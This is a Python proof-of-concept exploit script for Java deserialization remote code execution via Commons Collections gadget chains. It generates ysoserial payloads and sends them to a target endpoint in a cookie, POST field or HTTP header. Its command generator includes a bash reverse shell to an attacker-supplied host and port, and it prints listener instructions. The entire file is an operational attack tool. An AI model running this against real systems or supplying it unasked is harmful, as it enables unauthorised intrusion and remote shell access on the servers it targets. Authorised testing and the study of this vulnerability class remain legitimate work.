#!/usr/bin/env python3
"""
Java Deserialization - Commons Collections RCE PoC
CVE: Multiple CVEs (CVE-2015-4852, CVE-2015-7501, CVE-2017-3506, etc.)
Target: Java applications using Commons Collections vulnerable versions
Vulnerability: Insecure deserialization leading to Remote Code Execution

Reference:
- https://github.com/frohoff/ysoserial
- https://blog.orange.tw/2018/03/pwn2own-2018-exploit-development.html
- https://www.alphabot.com/security/blog/2017/java/Triggering-a-DNS-lookup-using-Java-Deserialization.html
- https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet

Exploit Flow:
1. Identify Java deserialization endpoint (cookies, parameters, headers)
2. Generate malicious serialized object using ysoserial (Commons Collections gadget chain)
3. Deliver payload via HTTP (Cookie, POST data, or custom header)
4. Trigger deserialization on server
5. Achieve RCE via gadget chain execution
6. Verify command execution (ping callback, sleep, or reverse shell)
"""

import argparse
import requests
import sys
import time
import base64
import subprocess
import os
from dataclasses import dataclass, field
from typing import Optional, List
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================================
# EXPLOIT CONTEXT
# ============================================================================

@dataclass(slots=True)
class ExploitContext:
    """Java deserialization exploit configuration and state."""

    # Target configuration
    target_ip: str
    target_port: int
    protocol: str = "http"
    endpoint: str = "/vulnerable"
    param_name: str = "data"
    delivery_method: str = "cookie"  # cookie, post, header

    # Attacker configuration
    attacker_ip: str
    attacker_port: int

    # Exploit configuration
    gadget_chain: str = "CommonsCollections5"
    ysoserial_path: str = "payloads/ysoserial-master-SNAPSHOT.jar"
    command_type: str = "ping"  # ping, sleep, reverse_shell
    proxy: Optional[str] = None
    encode_payload: bool = True

    # Runtime state
    session: requests.Session = field(default_factory=requests.Session, repr=False)
    deserialization_confirmed: bool = field(default=False, repr=False)
    rce_confirmed: bool = field(default=False, repr=False)
    payload_bytes: Optional[bytes] = field(default=None, repr=False)

    @classmethod
    def from_args(cls, args: argparse.Namespace) -> "ExploitContext":
        """Build ExploitContext from CLI arguments."""
        return cls(
            target_ip=args.target_ip,
            target_port=args.target_port,
            endpoint=args.endpoint,
            param_name=args.param_name,
            delivery_method=args.delivery,
            attacker_ip=args.listening_ip,
            attacker_port=args.listening_port,
            gadget_chain=args.gadget,
            ysoserial_path=args.ysoserial,
            command_type=args.command,
            proxy=args.proxy,
            encode_payload=not args.no_encode,
        )

    def get_base_url(self) -> str:
        """Construct base URL for target."""
        return f"{self.protocol}://{self.target_ip}:{self.target_port}"

    def get_target_url(self) -> str:
        """Construct full target URL including endpoint."""
        return f"{self.get_base_url()}{self.endpoint}"

    def get_proxies(self) -> Optional[dict]:
        """Return proxy configuration for requests."""
        if self.proxy:
            return {"http": self.proxy, "https": self.proxy}
        return None


# ============================================================================
# ARGUMENT PARSING
# ============================================================================

def parse_args() -> argparse.Namespace:
    """Parse command-line arguments."""
    parser = argparse.ArgumentParser(
        description="Java Deserialization (Commons Collections) RCE PoC",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic ping callback test
  %(prog)s 192.168.1.10 8080 10.10.14.5 4444

  # Reverse shell with specific gadget chain
  %(prog)s 192.168.1.10 8080 10.10.14.5 4444 --gadget CommonsCollections6 --command reverse_shell

  # Custom endpoint and delivery method
  %(prog)s 192.168.1.10 8080 10.10.14.5 4444 --endpoint /admin/deserialize --delivery post

Available Gadget Chains:
  CommonsCollections1-7, Spring1-2, ROME, Jdk7u21, CommonsCollections10, etc.
  (Use 'java -jar ysoserial.jar' to see full list)
"""
    )

    # Target configuration
    target_group = parser.add_argument_group("Target Configuration")
    target_group.add_argument("target_ip", help="Target IP address")
    target_group.add_argument("target_port", type=int, help="Target port")
    target_group.add_argument("--endpoint", default="/vulnerable",
                            help="Vulnerable endpoint path (default: /vulnerable)")
    target_group.add_argument("--param-name", default="data",
                            help="Parameter name for payload (default: data)")
    target_group.add_argument("--delivery", choices=["cookie", "post", "header"], default="cookie",
                            help="Payload delivery method (default: cookie)")

    # Attacker configuration
    attacker_group = parser.add_argument_group("Attacker Configuration")
    attacker_group.add_argument("listening_ip", help="Attacker IP for callbacks/reverse shell")
    attacker_group.add_argument("listening_port", type=int, help="Attacker listening port")

    # Exploit configuration
    exploit_group = parser.add_argument_group("Exploit Configuration")
    exploit_group.add_argument("--gadget", default="CommonsCollections5",
                             help="ysoserial gadget chain (default: CommonsCollections5)")
    exploit_group.add_argument("--ysoserial", default="payloads/ysoserial-master-SNAPSHOT.jar",
                             help="Path to ysoserial JAR")
    exploit_group.add_argument("--command", choices=["ping", "sleep", "reverse_shell"], default="ping",
                             help="Command type to execute (default: ping)")
    exploit_group.add_argument("--no-encode", action="store_true",
                             help="Don't base64 encode payload")

    # Optional
    optional_group = parser.add_argument_group("Optional")
    optional_group.add_argument("--proxy", help="HTTP proxy (e.g., http://127.0.0.1:8080)")

    return parser.parse_args()


# ============================================================================
# PAYLOAD GENERATION
# ============================================================================

def check_ysoserial_exists(ctx: ExploitContext) -> bool:
    """
    Check if ysoserial JAR file exists.

    Args:
        ctx: Exploit context

    Returns:
        True if file exists, False otherwise
    """
    if not os.path.exists(ctx.ysoserial_path):
        print(f"[-] ysoserial not found at: {ctx.ysoserial_path}")
        print(f"[!] Download from: https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar")
        return False
    return True


def list_gadget_chains(ctx: ExploitContext) -> List[str]:
    """
    List available ysoserial gadget chains.

    Args:
        ctx: Exploit context

    Returns:
        List of available gadget chain names
    """
    try:
        result = subprocess.run(
            ["java", "-jar", ctx.ysoserial_path],
            capture_output=True,
            text=True,
            timeout=5
        )
        # Parse output to extract gadget names
        lines = result.stderr.split('\n') if result.stderr else result.stdout.split('\n')
        gadgets = [line.strip() for line in lines if line.strip() and not line.startswith(' ') and not line.startswith('Y')]
        return gadgets
    except Exception as e:
        print(f"[!] Could not list gadgets: {e}")
        return []


def generate_command(ctx: ExploitContext) -> str:
    """
    Generate OS command based on command type.

    Args:
        ctx: Exploit context

    Returns:
        OS command string
    """
    if ctx.command_type == "ping":
        # Ping back to attacker (4 packets for Windows/Linux compatibility)
        return f"ping -c 4 {ctx.attacker_ip}"
    elif ctx.command_type == "sleep":
        # Sleep for 5 seconds to detect via timing
        return "sleep 5"
    elif ctx.command_type == "reverse_shell":
        # Bash reverse shell
        return f"bash -c 'bash -i >& /dev/tcp/{ctx.attacker_ip}/{ctx.attacker_port} 0>&1'"
    else:
        return f"echo {ctx.command_type}"


def generate_ysoserial_payload(ctx: ExploitContext) -> bytes:
    """
    Generate Java deserialization payload using ysoserial.

    Args:
        ctx: Exploit context

    Returns:
        Raw payload bytes

    Raises:
        RuntimeError: If ysoserial execution fails
    """
    print(f"\n[*] Generating ysoserial payload")
    print(f"    Gadget: {ctx.gadget_chain}")

    cmd = generate_command(ctx)
    print(f"    Command: {cmd}")

    try:
        result = subprocess.run(
            ["java", "-jar", ctx.ysoserial_path, ctx.gadget_chain, cmd],
            capture_output=True,
            timeout=10
        )

        if result.returncode != 0:
            error_msg = result.stderr.decode('utf-8', errors='ignore')
            raise RuntimeError(f"ysoserial failed: {error_msg}")

        payload = result.stdout
        print(f"[+] Generated {len(payload)} bytes payload")

        return payload

    except subprocess.TimeoutExpired:
        raise RuntimeError("ysoserial execution timed out")
    except FileNotFoundError:
        raise RuntimeError("Java not found - ensure Java is installed and in PATH")
    except Exception as e:
        raise RuntimeError(f"Payload generation failed: {e}")


def encode_payload(payload: bytes, encoding: str = "base64") -> str:
    """
    Encode payload for HTTP transport.

    Args:
        payload: Raw payload bytes
        encoding: Encoding method

    Returns:
        Encoded payload string
    """
    if encoding == "base64":
        return base64.b64encode(payload).decode('utf-8')
    else:
        return payload.hex()


# ============================================================================
# EXPLOIT STAGES
# ============================================================================

def stage_recon(ctx: ExploitContext) -> bool:
    """
    Stage 1: Reconnaissance.

    Verify target is reachable and identify Java application characteristics.

    Args:
        ctx: Exploit context

    Returns:
        True if recon successful
    """
    print("\n[*] Stage 1: Reconnaissance")

    try:
        # Basic connectivity check
        print(f"[*] Testing connectivity to {ctx.get_base_url()}")
        response = ctx.session.get(
            ctx.get_base_url(),
            proxies=ctx.get_proxies(),
            timeout=10,
            verify=False
        )
        print(f"[+] Target is reachable (HTTP {response.status_code})")

        # Check for Java indicators
        server_header = response.headers.get('Server', '')
        if any(indicator in server_header.lower() for indicator in ['tomcat', 'jetty', 'jboss', 'weblogic', 'websphere']):
            print(f"[+] Java application server detected: {server_header}")

        # Test vulnerable endpoint
        print(f"[*] Testing endpoint: {ctx.endpoint}")
        response = ctx.session.get(
            ctx.get_target_url(),
            proxies=ctx.get_proxies(),
            timeout=10,
            verify=False
        )

        if response.status_code == 404:
            print(f"[!] Warning: Endpoint returned 404 - may not exist")
        else:
            print(f"[+] Endpoint accessible (HTTP {response.status_code})")

        return True

    except requests.exceptions.RequestException as e:
        print(f"[-] Connection failed: {e}")
        return False


def stage_generate_payload(ctx: ExploitContext) -> bool:
    """
    Stage 2: Generate deserialization payload.

    Args:
        ctx: Exploit context

    Returns:
        True if payload generation successful
    """
    print("\n[*] Stage 2: Payload Generation")

    # Check ysoserial exists
    if not check_ysoserial_exists(ctx):
        return False

    try:
        # Generate payload
        ctx.payload_bytes = generate_ysoserial_payload(ctx)

        if ctx.encode_payload:
            encoded = encode_payload(ctx.payload_bytes)
            print(f"[+] Base64 encoded payload ({len(encoded)} chars)")
            print(f"[*] Preview: {encoded[:80]}..." if len(encoded) > 80 else f"[*] Encoded: {encoded}")

        return True

    except Exception as e:
        print(f"[-] Payload generation failed: {e}")
        return False


def stage_exploit(ctx: ExploitContext) -> bool:
    """
    Stage 3: Exploit deserialization vulnerability.

    Deliver payload to target using specified delivery method.

    Args:
        ctx: Exploit context

    Returns:
        True if exploitation successful
    """
    print("\n[*] Stage 3: Exploitation")
    print(f"[*] Delivery method: {ctx.delivery_method}")

    if ctx.payload_bytes is None:
        print("[-] No payload generated")
        return False

    # Prepare payload
    if ctx.encode_payload:
        payload_data = encode_payload(ctx.payload_bytes)
    else:
        payload_data = ctx.payload_bytes

    try:
        # Deliver payload based on method
        if ctx.delivery_method == "cookie":
            print(f"[*] Sending payload via Cookie: {ctx.param_name}")
            cookies = {ctx.param_name: payload_data}
            response = ctx.session.get(
                ctx.get_target_url(),
                cookies=cookies,
                proxies=ctx.get_proxies(),
                timeout=15,
                verify=False
            )

        elif ctx.delivery_method == "post":
            print(f"[*] Sending payload via POST parameter: {ctx.param_name}")
            data = {ctx.param_name: payload_data}
            response = ctx.session.post(
                ctx.get_target_url(),
                data=data,
                proxies=ctx.get_proxies(),
                timeout=15,
                verify=False
            )

        elif ctx.delivery_method == "header":
            print(f"[*] Sending payload via HTTP header: {ctx.param_name}")
            headers = {ctx.param_name: payload_data}
            response = ctx.session.get(
                ctx.get_target_url(),
                headers=headers,
                proxies=ctx.get_proxies(),
                timeout=15,
                verify=False
            )

        print(f"[+] Payload delivered (HTTP {response.status_code})")

        # Check for deserialization errors in response
        if any(indicator in response.text for indicator in ['ClassNotFoundException', 'StreamCorruptedException', 'InvalidClassException', 'java.io.']):
            print("[!] Java exception detected in response - deserialization may have occurred")
            ctx.deserialization_confirmed = True

        return True

    except requests.exceptions.Timeout:
        print("[+] Request timed out - this may indicate successful code execution")
        return True
    except requests.exceptions.RequestException as e:
        print(f"[-] Exploitation failed: {e}")
        return False


def stage_verify(ctx: ExploitContext) -> bool:
    """
    Stage 4: Verify RCE.

    Verify command execution based on command type.

    Args:
        ctx: Exploit context

    Returns:
        True if RCE verified
    """
    print("\n[*] Stage 4: Verification")

    if ctx.command_type == "ping":
        print(f"[*] Verification method: Ping callback")
        print(f"[!] Monitor for ICMP packets from {ctx.target_ip}")
        print(f"[!] On attacker machine, run: sudo tcpdump -i any icmp and src {ctx.target_ip}")
        print(f"[*] If you see ping packets, RCE is confirmed")

    elif ctx.command_type == "sleep":
        print(f"[*] Verification method: Time-based (sleep)")
        print(f"[*] If previous request took ~5+ seconds, RCE likely successful")

    elif ctx.command_type == "reverse_shell":
        print(f"[*] Verification method: Reverse shell")
        print(f"[!] Check your listener on {ctx.attacker_ip}:{ctx.attacker_port}")
        print(f"[!] If no shell received, ensure:")
        print(f"    - Listener is running (nc -lvnp {ctx.attacker_port})")
        print(f"    - No firewall blocking {ctx.attacker_port}")
        print(f"    - Target can reach {ctx.attacker_ip}")

    # Manual verification required
    response = input("\n[?] Did you verify RCE? (y/n): ")
    if response.lower() == 'y':
        ctx.rce_confirmed = True
        print("[+] RCE confirmed!")
        return True
    else:
        print("[!] RCE not confirmed - check verification steps")
        return False


# ============================================================================
# MAIN
# ============================================================================

def main():
    """Main execution."""
    print("[+] Java Deserialization (Commons Collections) RCE PoC")
    print("[+] Target: Java applications with vulnerable Commons Collections")

    args = parse_args()
    ctx = ExploitContext.from_args(args)

    print(f"\n[*] Configuration:")
    print(f"    Target: {ctx.get_target_url()}")
    print(f"    Attacker: {ctx.attacker_ip}:{ctx.attacker_port}")
    print(f"    Gadget: {ctx.gadget_chain}")
    print(f"    Command: {ctx.command_type}")
    print(f"    Delivery: {ctx.delivery_method}")

    try:
        # Stage 1: Recon
        if not stage_recon(ctx):
            print("\n[-] Reconnaissance failed")
            sys.exit(1)

        # Stage 2: Generate payload
        if not stage_generate_payload(ctx):
            print("\n[-] Payload generation failed")
            sys.exit(1)

        # Stage 3: Exploit
        if not stage_exploit(ctx):
            print("\n[-] Exploitation failed")
            sys.exit(1)

        # Stage 4: Verify
        if not stage_verify(ctx):
            print("\n[!] Exploitation completed but RCE not verified")
            print("[!] Manual verification required")
            sys.exit(1)

        print("\n[+] Exploitation successful!")
        print(f"[+] RCE achieved via {ctx.gadget_chain} gadget chain")

    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"\n[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    main()
